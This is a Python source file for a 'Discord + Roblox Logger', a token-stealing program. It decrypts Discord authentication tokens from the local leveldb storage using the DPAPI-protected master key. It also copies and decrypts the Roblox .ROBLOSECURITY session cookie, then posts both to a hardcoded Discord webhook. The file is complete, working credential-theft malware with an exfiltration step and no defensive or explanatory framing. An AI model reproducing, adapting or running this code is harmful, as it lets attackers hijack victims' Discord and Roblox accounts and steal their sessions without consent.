import os
import re
import json
import base64
import shutil
import win32crypt
import requests
from Crypto.Cipher import AES
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1497637243697762446/eUmmdHWtKWSSh4KWG8-Jwk1FDv_T2PqlVc8AQkg1K6DkXggiea9odLgdnQ4hLKdWy4_q"

def get_discord_tokens():
    paths = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
    ]

    unique_tokens = set()

    for leveldb_path in paths:
        if not os.path.exists(leveldb_path):
            continue

        local_state = os.path.join(os.path.dirname(leveldb_path), '..', 'Local State')
        if not os.path.exists(local_state):
            continue

        with open(local_state, 'r') as f:
            local_state_data = json.load(f)

        key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])[5:]
        master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        for file_name in os.listdir(leveldb_path):
            if not file_name.endswith(('.ldb', '.log')):
                continue

            with open(os.path.join(leveldb_path, file_name), 'r', errors='ignore') as f:
                content = f.read()

            matches = re.findall(r'dQw4w9WgXcQ:([A-Za-z0-9+/=]{100,})', content)
            for match in matches:
                try:
                    encrypted_data = base64.b64decode(match)
                    iv = encrypted_data[3:15]
                    payload = encrypted_data[15:]
                    tag = payload[-16:]
                    ciphertext = payload[:-16]
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                    token = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                    if re.match(r'[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,38}', token):
                        unique_tokens.add(token)
                except:
                    pass

    if unique_tokens:
        return list(unique_tokens)[0]
    return None

def get_roblox_cookie():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    if not os.path.exists(roblox_cookies_path):
        return None
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)
        encoded_cookies = file_content.get("CookiesData", "")
        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
        roblosecurity_match = re.search(r'\.ROBLOSECURITY\s+([^\s]+)', decrypted_text)
        if roblosecurity_match:
            return roblosecurity_match.group(1)
        return None
    except Exception as e:
        return None
    finally:
        if os.path.exists(destination_path):
            try:
                os.remove(destination_path)
            except:
                pass

if __name__ == "__main__":
    discord_token = get_discord_tokens()
    roblox_token = get_roblox_cookie()
    
    embed = {
        "title": "Discord + Roblox Logger",
        "color": 0x5865F2,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [
            {"name": "Discord Token", "value": f"```{discord_token if discord_token else 'Not found'}```", "inline": False},
            {"name": "Roblox Cookie", "value": f"```{roblox_token if roblox_token else 'Not found'}```", "inline": False}
        ],
        "footer": {"text": "Made by Hyper and Sensai Ryzen"}
    }
    print("Works", discord_token, roblox_token)
    requests.post(WEBHOOK_URL, json={"embeds": [embed]})
